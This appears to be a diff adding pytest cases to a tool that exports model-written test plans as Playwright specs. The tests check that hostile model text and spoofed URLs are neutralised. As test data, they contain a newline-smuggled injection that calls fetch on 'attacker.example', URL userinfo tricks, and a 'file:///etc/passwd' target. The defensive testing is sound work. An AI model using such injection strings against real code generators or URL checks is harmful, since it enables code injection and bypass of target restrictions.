@@ -143,6 +143,37 @@ def test_demo_variants_ship_only_one_code_path():
 
 @pytest.mark.parametrize("url,ok", [("http://localhost:3000/x", True), ("http://127.0.0.1:8000", True),
                                      ("http://app.test/", True), ("https://example.com", False),
-                                     ("http://192.168.1.4", False), ("file:///etc/passwd", False)])
+                                     ("http://192.168.1.4", False), ("file:///etc/passwd", False),
+                                     ("http://x.invalid\\@localhost/", False), ("http://evil.example@localhost/", False),
+                                     ("http://localhost /x", False)])
 def test_only_local_targets_by_default(url, ok):
     assert is_local_url(url) is ok
+
+
+def test_model_text_cannot_break_out_of_comments_in_exported_tests():
+    from faultline.export import to_playwright_spec
+    accepted, _ = normalize_plan({"hypotheses": [{
+        "id": "x", "claim": "evil\nawait fetch('https://attacker.example')", "fault_class": "other",
+        "steps": [step("fill", "e2", "Ada")], "perturbations": [],
+        "invariants": [{"kind": "value_equals", "ref": "e2", "value": "Ada"}]}]}, INV)
+    assert "\n" not in accepted[0]["claim"]
+    element = dict(INV["elements"][1], tag="input", locator={"by": "testid", "value": "name\u2028x"})
+    cx = {"title": "a\u2028b\nc", "attribution": "x\ny", "experiment": accepted[0], "elements": {"e2": element}}
+    spec = to_playwright_spec(cx, "http://localhost:1/")
+    assert "\u2028" not in spec and "\u2029" not in spec
+    assert all(not line.lstrip().startswith("await fetch") for line in spec.splitlines())
+
+
+def test_line_separators_are_not_accepted_as_typed_values():
+    with pytest.raises(PlanError, match="printable"):
+        normalize_experiment(exp([step("fill", "e2", "a\u2028b")], invs=[{"kind": "no_page_errors"}]), INV)
+
+
+def test_malformed_model_output_is_rejected_not_crashing():
+    accepted, rejected = normalize_plan({"hypotheses": [
+        {"id": "a", "claim": "c", "steps": [step("click", "e1")], "perturbations": ["oops"],
+         "invariants": [{"kind": "no_page_errors"}]},
+        {"id": "b", "claim": "c", "steps": [step("click", "e1")], "perturbations": [], "invariants": ["oops"]},
+        "not an object",
+    ]}, INV)
+    assert accepted == [] and len(rejected) == 3
